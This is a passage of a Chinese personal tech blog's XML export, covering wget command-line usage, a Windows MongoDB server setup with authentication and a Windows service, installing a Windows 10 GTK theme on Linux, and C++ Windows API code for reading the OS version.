class="hljs-params">--method</span><br>       <span class="hljs-params">--post-file=</span>文件            发送 &lt;文件&gt; 内容，必须设置 <span class="hljs-params">--method</span><br>       <span class="hljs-params">--content-disposition</span>       当选择本地文件名时允许 Content-Disposition<br>                                   头部 <span class="hljs-params">(实验中)</span>。<br>       <span class="hljs-params">--content-on-error</span>          在服务器错误时输出接收到的内容<br>       <span class="hljs-params">--auth-no-challenge</span>         不先等待服务器询问就发送基本 HTTP 验证信息。<br>HTTPS <span class="hljs-params">(SSL/TLS)</span> 选项：<br>       <span class="hljs-params">--secure-protocol=PR</span>        choose secure protocol, one of auto, SSLv2,<br>                                     SSLv3, TLSv1, TLSv1_1, TLSv1_2 and PFS<br>       <span class="hljs-params">--https-only</span>                 只跟随安全的 HTTPS 链接<br>       <span class="hljs-params">--no-check-certificate</span>       不要验证服务器的证书。<br>       <span class="hljs-params">--certificate=</span>文件           客户端证书文件。<br>       <span class="hljs-params">--certificate-type=</span>类型      客户端证书类型，PEM 或 DER。<br>       <span class="hljs-params">--private-key=</span>文件           私钥文件。<br>       <span class="hljs-params">--private-key-type=</span>类型      私钥文件类型，PEM 或 DER。<br>       <span class="hljs-params">--ca-certificate=</span>文件        带有一组 CA 证书的文件。<br>       <span class="hljs-params">--ca-directory=DIR</span>           保存 CA 证书的哈希列表的目录。<br>       <span class="hljs-params">--ca-certificate=</span>文件        带有一组 CA 证书的文件。<br>       <span class="hljs-params">--pinnedpubkey=</span>文件/散列值  用于验证节点的公钥（PEM/DER）文件或<br>                                   任何数量的 sha256 散列值，以 base64 编码、<br>                                   “sha256//” 开头、用“;”间隔<br>HSTS 选项：<br>       <span class="hljs-params">--no-hsts</span>                   禁用 HSTS<br>       <span class="hljs-params">--hsts-file</span>                 HSTS 数据库路径（将覆盖默认值）<br>FTP 选项：<br>       <span class="hljs-params">--ftp-user=</span>用户             设置 ftp 用户名为 &lt;用户&gt;。<br>       <span class="hljs-params">--ftp-password=</span>密码         设置 ftp 密码为 &lt;密码&gt;<br>       <span class="hljs-params">--no-remove-listing</span>         不要删除‘<span class="hljs-string">.listing</span>’文件<br>       <span class="hljs-params">--no-glob</span>                   不在 FTP 文件名中使用通配符展开<br>       <span class="hljs-params">--no-passive-ftp</span>            禁用“passive”传输模式<br>       <span class="hljs-params">--preserve-permissions</span>      保留远程文件的权限<br>       <span class="hljs-params">--retr-symlinks</span>             递归目录时，获取链接的文件 <span class="hljs-params">(而非目录)</span><br>FTPS 选项：<br>       <span class="hljs-params">--ftps-implicit</span>                 使用隐式 FTPS（默认端口 990）<br>       <span class="hljs-params">--ftps-resume-ssl</span>               打开数据连接时继续控制连接中的 SSL/TLS 会话<br>       <span class="hljs-params">--ftps-clear-data-connection</span>    只加密控制信道；数据传输使用明文<br>       <span class="hljs-params">--ftps-fallback-to-ftp</span>          回落到 FTP，如果目标服务器不支持 FTPS<br>WARC 选项：<br>       <span class="hljs-params">--warc-file=</span>文件名          在一个 <span class="hljs-string">.warc.gz</span> 文件里保持请求/响应数据<br>       <span class="hljs-params">--warc-header=</span>字符串        在头部插入 &lt;字符串&gt;<br>       <span class="hljs-params">--warc-max-size=</span>数字        将 WARC 的最大尺寸设置为 &lt;数字&gt;<br>       <span class="hljs-params">--warc-cdx</span>                  写入 CDX 索引文件<br>       <span class="hljs-params">--warc-dedup=</span>文件名         不要记录列在此 CDX 文件内的记录<br>       <span class="hljs-params">--no-warc-compression</span>       不要 GZIP 压缩 WARC 文件<br>       <span class="hljs-params">--no-warc-digests</span>           不要计算 SHA1 摘要<br>       <span class="hljs-params">--no-warc-keep-log</span>          不要在 WARC 记录中存储日志文件<br>       <span class="hljs-params">--warc-tempdir=</span>目录         WARC 写入器的临时文件目录<br>递归下载：<br>  -r,  <span class="hljs-params">--recursive</span>                 指定递归下载<br>  -l,  <span class="hljs-params">--level=</span>数字                最大递归深度 <span class="hljs-params">(inf 或 0 代表无限制，即全部下载)</span>。<br>       <span class="hljs-params">--delete-after</span>             下载完成后删除本地文件<br>  -k,  <span class="hljs-params">--convert-links</span>            让下载得到的 HTML 或 CSS 中的链接指向本地文件<br>       <span class="hljs-params">--convert-file-only</span>         只转换 URL 的文件部分（一般叫做“基础名”<span class="hljs-string">/basename</span>）<br>       <span class="hljs-params">--backups=N</span>                 写入文件 X 前，轮换移动最多 N 个备份文件<br>  -K,  <span class="hljs-params">--backup-converted</span>         在转换文件 X 前先将它备份为 X.orig。<br>  -m,  <span class="hljs-params">--mirror</span>                   -N -r -l inf <span class="hljs-params">--no-remove-listing</span> 的缩写形式。<br>  -p,  <span class="hljs-params">--page-requisites</span>          下载所有用于显示 HTML 页面的图片之类的元素。<br>       <span class="hljs-params">--strict-comments</span>          用严格方式 <span class="hljs-params">(SGML)</span> 处理 HTML 注释。<br>递归接受/拒绝：<br>  -A,  <span class="hljs-params">--accept=</span>列表               逗号分隔的可接受的扩展名列表<br>  -R,  <span class="hljs-params">--reject=</span>列表               逗号分隔的要拒绝的扩展名列表<br>       <span class="hljs-params">--accept-regex=REGEX</span>        匹配接受的 URL 的正则表达式<br>       <span class="hljs-params">--reject-regex=REGEX</span>        匹配拒绝的 URL 的正则表达式<br>       <span class="hljs-params">--regex-type=</span>类型           正则类型 <span class="hljs-params">(posix|pcre)</span><br>  -D,  <span class="hljs-params">--domains=</span>列表              逗号分隔的可接受的域名列表<br>       <span class="hljs-params">--exclude-domains=</span>列表      逗号分隔的要拒绝的域名列表<br>       <span class="hljs-params">--follow-ftp</span>                跟踪 HTML 文档中的 FTP 链接<br>       <span class="hljs-params">--follow-tags=</span>列表          逗号分隔的跟踪的 HTML 标识列表<br>       <span class="hljs-params">--ignore-tags=</span>列表          逗号分隔的忽略的 HTML 标识列表<br>  -H,  <span class="hljs-params">--span-hosts</span>                递归时转向外部主机<br>  -L,  <span class="hljs-params">--relative</span>                  仅跟踪相对链接<br>  -I,  <span class="hljs-params">--include-directories=</span>列表  允许目录的列表<br>       <span class="hljs-params">--trust-server-names</span>        使用重定向 URL 的最后一段作为本地文件名<br>  -X,  <span class="hljs-params">--exclude-directories=</span>列表  排除目录的列表<br>  -np, <span class="hljs-params">--no-parent</span>                 不追溯至父目录<br></code></pre></div></td></tr></table></figure>
<p>如此多的参数,看着实在望而生畏,不过好在这是有中文的,所以…慢慢来</p>
<p>下面以实例来介绍该用具的主要用法</p>
<h4 id="下载单个文件"><a class="markdownIt-Anchor" href="#下载单个文件"></a> 下载单个文件</h4>
<p># wget <a href="https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz">https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz</a> -P save_files -O wget.tar.gz</p>
<blockquote>
<p>–2018-01-06 17:22:48– <a href="https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz">https://ftp.gnu.org/gnu/wget/wget-1.19.tar.gz</a><br />
正在解析主机 <a href="http://ftp.gnu.org">ftp.gnu.org</a> (<a href="http://ftp.gnu.org">ftp.gnu.org</a>)… 208.118.235.20, 2001:4830:134:3::b<br />
正在连接 <a href="http://ftp.gnu.org">ftp.gnu.org</a> (<a href="http://ftp.gnu.org">ftp.gnu.org</a>)|208.118.235.20|:443… 已连接。<br />
已发出 HTTP 请求，正在等待回应… 200 OK<br />
长度：4202290 (4.0M) [application/x-gzip]<br />
正在保存至: “wget.tar.gz”<br />
6%[=&gt; ] 280.00K 21.8KB/s 剩余 3m 6s</p>
</blockquote>
<ul>
<li>
<p>-O 指定输出文件的名字</p>
</li>
<li>
<p>-P 指定保存文件的目录 (未指定该参数默认保存在当前路径)</p>
<h4 id="下载多个文件"><a class="markdownIt-Anchor" href="#下载多个文件"></a> 下载多个文件</h4>
<p>可以把要下载的多个链接地址保存到一个文件中,并在wget时指定 -i 参数</p>
</li>
</ul>
<p>#  wget -i files.txt</p>
<h4 id="断点续传"><a class="markdownIt-Anchor" href="#断点续传"></a> 断点续传</h4>
<p>有时候在下载一个比较大的文件,碰到网络环境不好或者突然断网了,那么要重新下载这个文件了.为了避免这种情况发生,大多数下载软件都支持断点续传.顾名思义,就是在网络等问题的影响下而被中断下载后,等到网络恢复后,在原来的地方接着下载.</p>
<p>wget也支持该功能,由参数 <strong>-c</strong> 指定<br />
# wget -c <a href="https://baidu.com">https://baidu.com</a> -t 5</p>
<ul>
<li>-t 指定<strong>重试次数</strong> ,0 表示无限制</li>
</ul>
<h4 id="代理下载"><a class="markdownIt-Anchor" href="#代理下载"></a> 代理下载</h4>
<p>要下载一个国外的文件,有时运气不好(被墙),导致无法下载所需文件.这时就要使用代理了,而不是纠结该链接地址有问题.</p>
<p>说到代理,可以是本地搭建代理的服务器,也可以从网络上获得的公共服务器,这里以本地代理服务器为例.<br />
不过在此之前我已设置好了代理服务器,该服务器为: <a href="http://127.0.0.1:8087">http://127.0.0.1:8087</a></p>
<p># wget <a href="https://www.google.com">https://www.google.com</a> -O output.html <strong>-e “use_proxy=on” -e “https_proxy=http://127.0.0.1:8087“</strong></p>
<ul>
<li>-e 运行一个“.wgetrc”风格的命令,<strong>wgetrc</strong>文件位于 /etc/wgetrc,为wget运行时的初始化文件.也可以在该文件里设置代理服务器地址(全局变量)</li>
<li>use_proxy=on/no 使用/禁止代理,一般使用代理时,要指明该操作</li>
<li>http_proxy/https_proxy/ftp_proxy 3种协议的代理服务器,格式<strong>皆为</strong>: <a href="http://proxy.yoyodyne.com:18023">http://proxy.yoyodyne.com:18023</a></li>
</ul>
<p>运行该命令输出如下</p>
<blockquote>
<p>–2018-01-06 17:45:29– <a href="https://www.google.com/">https://www.google.com/</a><br />
正在连接 127.0.0.1:8087… 已连接。<br />
错误: “<a href="http://www.google.com">www.google.com</a>” 的证书不可信。<br />
错误: “<a href="http://www.google.com">www.google.com</a>” 的证书颁发者未知。<br />
错误: “<a href="http://www.google.com">www.google.com</a>” 的证书使用不安全的算法签名。</p>
</blockquote>
<p>注意该处,我用的是 <strong>gae_proxy</strong> ,由于证书问题而出现该错误,解决方法两种</p>
<ul>
<li>直接在原来命令行后加上 <strong>–no-check-certificate</strong>选项 ,表示不检查证书安全问题,忽略该过程.且<strong>错误</strong>变成了<strong>警告</strong></li>
<li>指定证书,我的是 <strong>CA.crt</strong> 用到 <strong>–ca-certificate</strong> 选项,之后便可正常下载了.如:</li>
</ul>
<blockquote>
<p>wget <a href="https://www.google.com">https://www.google.com</a> -O output.html –progress=dot -e “use_proxy=on” -e “https_proxy=http://127.0.0.1:8087“ <strong>–ca-certificate=data/gae_proxy/CA.crt</strong></p>
</blockquote>
<h4 id="限速下载"><a class="markdownIt-Anchor" href="#限速下载"></a> 限速下载</h4>
<p># wget <strong>–limit-rate=10k</strong> <a href="https://ftp.gnu.org/gnu/wget/wget-1.18.tar.gz">https://ftp.gnu.org/gnu/wget/wget-1.18.tar.gz</a></p>
<ul>
<li>–limit-rate 指定要限制的大小</li>
</ul>
<p><img src="/uploads/images/wget/file_002.gif" alt="img" /></p>
<h4 id="测试下载链接"><a class="markdownIt-Anchor" href="#测试下载链接"></a> 测试下载链接</h4>
<p># wget –spider <a href="http://baidu.com">http://baidu.com</a></p>
<blockquote>
<p>打开 Spider 模式。检查是否存在远程文件。<br />
–2018-01-06 18:13:16– <a href="http://baidu.com/">http://baidu.com/</a><br />
正在解析主机 <a href="http://baidu.com">baidu.com</a> (<a href="http://baidu.com">baidu.com</a>)… 111.13.101.208, 123.125.114.144, 220.181.57.217<br />
正在连接 <a href="http://baidu.com">baidu.com</a> (<a href="http://baidu.com">baidu.com</a>)|111.13.101.208|:80… 已连接。<br />
已发出 HTTP 请求，正在等待回应… 200 OK<br />
长度：81 [text/html]<br />
<strong>存在远程文件且该文件可能含有更深层的链接，但不能进行递归操作 – 无法获取</strong></p>
</blockquote>
<ul>
<li>通过 –spider参数,可以测试下载链接是否有效</li>
</ul>
<p>最后一个例子:</p>
<p># wget –user-agent=”Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36” <a href="https://ftp.gnu.org/gnu/wget/wget-1.18.tar.xz">https://ftp.gnu.org/gnu/wget/wget-1.18.tar.xz</a> -e “use_proxy=on” -e “http_proxy=http://127.0.0.1:8087“ -t 5 -P save_file –progress=dot</p>
<p>更多的参数还是要去查看帮助文档的…</p>
<h3 id="结束"><a class="markdownIt-Anchor" href="#结束"></a> 结束</h3>
<p>bye~</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB数据库搭建(Windows)</title>
    <url>/win-mongodb/</url>
    <content><![CDATA[<p>关于MongoD非关系数据库，网上有太多的解释，与其讲得再多，还不如亲自体验一下</p>
<span id="more"></span>
<h3 id="mongodb"><a class="markdownIt-Anchor" href="#mongodb"></a> MongoDB</h3>
<p>有用过MySQL，PostgreSQL，sqlite3等这些数据库的，是时候应该考虑下MongoDB了。。此处之外，MongoDB搭建也是非常简单的，本文以windows系统为例（问：为什么不是Linux？答：我想怎么玩就这么怎么玩！管得着？）</p>
<p>测试环境：</p>
<blockquote>
<p>Windows 10<br />
MongoDB 3.6.3</p>
</blockquote>
<p><a href="https://www.mongodb.com">下载地址见官网</a></p>
<p>下载完成后是一个压缩文件，解压后bin目录下有如下文件<br />
<img src="/uploads/images/windows/file_001.png" alt="img" /></p>
<p>mongod.exe 数据库服务器进程（守护进程）<br />
mongo.exe 用于与服务器进行交互的shell控制台（JavaScript）<br />
mongoexport.exe 数据导出（备份）<br />
mongoimport.exe 数据导入（恢复）</p>
<p>进入CMD，cd 到mongoDB bin目录，通过 <code>mongod.exe --help</code> 可查看可执行文件的参数列表，参数还挺多的。。。<br />
<img src="/uploads/images/windows/file_002.png" alt="img" /></p>
<p>注意那一个参数</p>
<blockquote>
<p>-f [ –config ] arg configuration file specifying additional options</p>
</blockquote>
<p>可以指定一个配置文件作为服务器启动的参数<br />
比如以下几个参数：</p>
<blockquote>
<p>dbpath=C:\MongoDB\data\db<br />
logpath=C:\MongoDB\logs\mongo.log<br />
logappend=true<br />
port=27017<br />
auth=true<br />
bind_ip_all=true</p>
</blockquote>
<p><strong>dbpath</strong> 指定database<strong>目录</strong>，默认为 <em><em>C:\data\db*</em><br />
<strong>logpath</strong> 指定日志</em><em>文件</em>*，而不是标准输出到console。注意是文件，不是目录！<br />
<strong>logappend</strong> 指定以追加的模式写入日志文件，而不是覆盖<br />
<strong>port</strong> 指定服务器监听的端口，默认 27017<br />
<strong>auth</strong> 指定访问数据库时必须要经过身份验证<br />
<strong>bind_ip_all</strong> 绑定（监听）所有IP地址，或者 <strong>bind_ip</strong> 指定要绑定的IP地址列表，默认 <strong>localhost</strong><br />
关于配置文件更详细信息还得去官网查查…</p>
<p>MongoDB根目录下所有的文件，不存在的目录和文件自行创建</p>
<blockquote>
<p>C:\MongoDB<br />
|–bin<br />
——-|– …<br />
|–conf<br />
——-|– mongo.conf<br />
|–data<br />
——-|– db<br />
|–logs<br />
——-|– mongo.log</p>
</blockquote>
<p>之后在<br />
<code>mongod.exe --config c:\MongoDB\conf\mongo.conf</code><br />
<img src="/uploads/images/windows/file_003.png" alt="img" /></p>
<p>接着我们输出 show dbs</p>
<blockquote>
<p>&gt;show dbs<br />
2018-02-21T10:29:48.852+0800 E QUERY [thread1] Error: listDatabases failed:{<br />
“ok” : 0,<br />
“errmsg” : “not authorized on admin to execute command { listDatabases: 1.0, $db: \”admin\” }”,<br />
“code” : 13,<br />
“codeName” : “Unauthorized”<br />
} :<br />
_getErrorWithCode@src/mongo/shell/utils.js:25:13<br />
Mongo.prototype.getDBs@src/mongo/shell/mongo.js:65:1<br />
shellHelper.show@src/mongo/shell/utils.js:816:19<br />
shellHelper@src/mongo/shell/utils.js:706:15<br />
@(shellhelp2):1:1<br />
&gt;</p>
</blockquote>
<p>报错了，因为没有权限列举出所有的database，这就是之前的 <strong>auth</strong> 的作用。那么现在创建一个用户</p>
<blockquote>
<p>&gt; <strong>use admin</strong><br />
switched to db admin<br />
&gt; <strong>db.createUser({user:’fuck’,pwd:’12345’,roles:[{role:’root’,db:’admin’}]})</strong></p>
<p>Successfully added user: {<br />
“user” : “fuck”,<br />
“roles” : [<br />
{<br />
“role” : “root”,<br />
“db” : “admin”<br />
}<br />
]<br />
}<br />
&gt;</p>
</blockquote>
<p>首先，切换到 admin 这个database，然后通过 <code>db.createUser</code> 来创建一个新的用户，这里创建一个root权限的用户 😃<br />
exit，重新进入 mongo console<br />
再次 <code>show dbs</code>，同样报错。接着</p>
<blockquote>
<p>&gt;use admin<br />
&gt;db.auth(‘fuck’,’12345’)<br />
&gt;1<br />
&gt;show dbs<br />
admin 0.000GB<br />
config 0.000GB<br />
local 0.000GB<br />
1 说明验证成功；0 验证失败</p>
</blockquote>
<p>现在我们已经成功搭建的MongoDB服务器。。等等，那么我们下次开机还不是还要重新通过命令行来启动服务器？这样也太麻烦了吧。是的，所以可以把MongoDB添加到系统服务里面，让它开机自启动。</p>
<p>还记得 <code>mongod.exe --help</code>吗？我们可以找找有哪些参数有用得到的。。。</p>
<p>Windows服务控制管理</p>
<blockquote>
<p>Windows Service Control Manager options:<br />
<strong>–install</strong> install Windows service<br />
<strong>–remove</strong> remove Windows service<br />
-<strong>-reinstall</strong> reinstall Windows service (equivalent<br />
to –remove followed by –install)<br />
<strong>–serviceName</strong> arg Windows service name<br />
<strong>–serviceDisplayName</strong> arg Windows service display name<br />
<strong>–serviceDescription</strong> arg Windows service description<br />
<strong>–serviceUser</strong> arg account for service execution<br />
<strong>–servicePassword</strong> arg password used to authenticate<br />
serviceUser</p>
</blockquote>
<p>那么，我们可以这样做，通过 --install 安装系统服务</p>
<blockquote>
<p>mongod.exe --config c:\MongoDB\conf\mongo.conf <strong>–serviceName MongoDB</strong> --serviceDisplayName MongoDB_Server --serviceDescription “This is my MongoDB Server…” <strong>–install</strong></p>
</blockquote>
<p><img src="/uploads/images/windows/file_004.png" alt="img" /></p>
<p>看！是不是OK了，So easy!除此之外，我们还可以把 <code>C:\MongoDB\bin</code> 添加到PATH环境变量里。<br />
现在启动该服务或者 <code>net start MongoDB</code>，回到cmd，输入</p>
<blockquote>
<p>mongo -u fuck -p 12345 admin</p>
</blockquote>
<p>-u 指定用户名称<br />
-p 指定用户密码<br />
后面的 admin 则是要登录的database</p>
<h3 id="结尾"><a class="markdownIt-Anchor" href="#结尾"></a> 结尾</h3>
<p>嗯…很简单吧！除此之外，MongoDB数据库提供的编程接口也是支持大多数语言的，比如 C，C++，Java，Python，PHP……具体可从官网上查看使用方法。对于C/C++，似乎挺复杂的。</p>
]]></content>
      <categories>
        <category>MongoDB</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10 GTK Theme</title>
    <url>/windows10-gtk-theme/</url>
    <content><![CDATA[<p>最近偶然看到一篇文章,讲的是讲Linux主题配置成Windows10,咋一看,挺好奇的,所以才出了本文</p>
<p><img src="/uploads/images/windows/w10-3.png" alt="img" /></p>
<span id="more"></span>
<h3 id="获取windows10-gtk-theme"><a class="markdownIt-Anchor" href="#获取windows10-gtk-theme"></a> 获取Windows10 GTK Theme</h3>
<h4 id="windows-10-light"><a class="markdownIt-Anchor" href="#windows-10-light"></a> Windows 10 Light</h4>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/B00merang-Project/</span>Windows-<span class="hljs-number">10</span>.git<br>sudo mv Windows-<span class="hljs-number">10</span> <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/themes/</span><br></code></pre></div></td></tr></table></figure>
<h4 id="windows-10-dark"><a class="markdownIt-Anchor" href="#windows-10-dark"></a> Windows 10 Dark</h4>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/B00merang-Project/</span>Windows-<span class="hljs-number">10</span>-Dark.git<br>sudo mv Windows-<span class="hljs-number">10</span>-Dark <span class="hljs-regexp">/usr/</span>share/themes<br></code></pre></div></td></tr></table></figure>
<h4 id="windows-10-universal"><a class="markdownIt-Anchor" href="#windows-10-universal"></a> Windows 10 Universal</h4>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/B00merang-Project/</span>Windows-<span class="hljs-number">10</span>-Metro.git<br>sudo mv Windows-<span class="hljs-number">10</span>-Metro <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/themes/</span><br></code></pre></div></td></tr></table></figure>
<h3 id="设置图标icons"><a class="markdownIt-Anchor" href="#设置图标icons"></a> 设置图标(Icons)</h3>
<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> https://github.com/Elbullazul/Windows-<span class="hljs-number">10</span>/releases/download/v<span class="hljs-number">0</span>.<span class="hljs-number">9</span>.<span class="hljs-number">6</span>/Windows.<span class="hljs-number">10</span>.Icons.v<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.zip<br><span class="hljs-attribute">unzip</span> Windows.<span class="hljs-number">10</span>.Icons.v<span class="hljs-number">0</span>.<span class="hljs-number">4</span>.<span class="hljs-number">1</span>.zip<br><span class="hljs-attribute">mv</span> &#x27;Windows <span class="hljs-number">10</span> Icons&#x27; /usr/share/icons<br></code></pre></div></td></tr></table></figure>
<h3 id="设置墙纸wallpaper"><a class="markdownIt-Anchor" href="#设置墙纸wallpaper"></a> 设置墙纸(Wallpaper)</h3>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/themes/</span>Windows-<span class="hljs-number">10</span><br>ls<br>cp wallpaper.jpg ~/Pictures<br></code></pre></div></td></tr></table></figure>
<p>之后就可以通过 <strong>gnome-tweak-tool</strong> 设置主题了…</p>
<p>另外可参考<br />
<a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-windows-10/">How To Make Linux Look Like <strong>Windows 10</strong></a><br />
<a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-windows-vista/">How To Make Linux Look Like <strong>Windows Vista</strong></a><br />
<a href="https://www.addictivetips.com/ubuntu-linux-tips/make-your-linux-desktop-look-like-windows-xp/">How To Make Linux Look Like <strong>Windows XP</strong></a><br />
<a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-macos/">How To Make Linux Look Like <strong>macOS</strong></a><br />
<a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-chrome-os/">How To Make Linux Look Like <strong>Chrome OS</strong></a></p>
<p>bye~~</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>WindowsAPI获取操作系统主次版本号</title>
    <url>/windows-getosversion/</url>
    <content><![CDATA[<p>列举了一些目前所知道的方法来获取Windows操作系统版本号</p>
<span id="more"></span>
<ul>
<li>方法1 <strong>RtlGetNtVersionNumbers</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-comment">//定义函数指针</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">void</span><span class="hljs-params">(__stdcall*NTPROC)</span><span class="hljs-params">(DWORD*, DWORD*, DWORD*)</span></span>;<br><span class="hljs-comment">//载入模块</span><br>HMODULE hmod= <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><span class="hljs-comment">//获取函数地址</span><br>NTPROC RtlGetNtVersionNumbers = (NTPROC)<span class="hljs-built_in">GetProcAddress</span>(hmod, <span class="hljs-string">&quot;RtlGetNtVersionNumbers&quot;</span>);<br>	DWORD dwMajor, dwMin, dwOpt;<br>	<span class="hljs-built_in">RtlGetNtVersionNumbers</span>(&amp;dwMajor, &amp;dwMin, &amp;dwOpt);<br>	<span class="hljs-comment">//卸载模块</span><br>	<span class="hljs-built_in">FreeLibrary</span>(hmod);<br></code></pre></div></td></tr></table></figure>
<ul>
<li>方法2 <strong>GetVersion</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">DWORD dwVersion= <span class="hljs-built_in">GetVersion</span>();<br><span class="hljs-comment">//低16位</span><br>WORD lwo = <span class="hljs-built_in">LOWORD</span>(dwVersion);<br>BYTE minor = <span class="hljs-built_in">HIBYTE</span>(lwo);	<span class="hljs-comment">//次版本号</span><br>BYTE major = <span class="hljs-built_in">LOBYTE</span>(lwo);   <span class="hljs-comment">//主版本号</span><br><span class="hljs-keyword">if</span> (major ==<span class="hljs-number">10</span>)  <span class="hljs-built_in">SetWindowText</span>(<span class="hljs-string">L&quot;Windows 10&quot;</span>);<br><span class="hljs-keyword">if</span> (major ==<span class="hljs-number">6</span>)  <span class="hljs-built_in">SetWindowText</span>(<span class="hljs-string">L&quot;Windows 7&quot;</span>);<br><br></code></pre></div></td></tr></table></figure>
<ul>
<li>方法3 <strong>GetVersionEx</strong></li>
</ul>
<figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">GetVersionEx</span><span class="hljs-params">(POSVERSIONINFO pVersionInformation)</span></span>;<br>	 <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span> <br>	DWORD dwOSVersionInfoSize;       <span class="hljs-comment">//在使用GetVersionEx之前要将此初始化为结构的大小 </span><br>	DWORD dwMajorVersion;               <span class="hljs-comment">//系统主版本号 </span><br>	DWORD dwMinorVersion;               <span class="hljs-comment">//系统次版本号 </span><br>	DWORD dwBuildNumber;               <span class="hljs-comment">//系统构建号 </span><br>	DWORD dwPlatformId;                  <span class="hljs-comment">//系统支持的平台 </span><br>	TCHAR szCSDVersion[<span class="hljs-number">128</span>];          <span class="hljs-comment">//系统补丁包的名称 </span><br>	WORD wServicePackMajor;            <span class="hljs-comment">//系统补丁包的主版本 </span><br>	WORD wServicePackMinor;            <span class="hljs-comment">//系统补丁包的次版本 </span><br>	WORD wSuiteMask;                      <span class="hljs-comment">//标识系统上的程序组 </span><br>	BYTE wProductType;                    <span class="hljs-comment">//标识系统类型 </span><br>	BYTE wReserved;                         <span class="hljs-comment">//保留,未使用 </span><br>&#125;OSVERSIONINFOEX, *POSVERSIONINFOEX;<br></code></pre></div></td></tr></table></figure>
<p>注意,使用该函数在Windows8和Windows10之间获取的是同一个主次版本号,所以,要在项目添加一个清单文件(manifest)<br />
<strong>配置属性-&gt;清单工具-&gt;输入和输出-附加清单文件,填写manifest.xml</strong></p>
<p><strong>manifest.xml文件内容</strong></p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">assembly</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;urn:schemas-microsoft-com:asm.v1&quot;</span> <span class="hljs-attr">manifestVersion</span>=<span class="hljs-string">&quot;1.0&quot;</span>&gt;</span> <br>    <span class="hljs-tag">&lt;<span class="hljs-name">compatibility</span> <span class="hljs-attr">xmlns</span>=<span 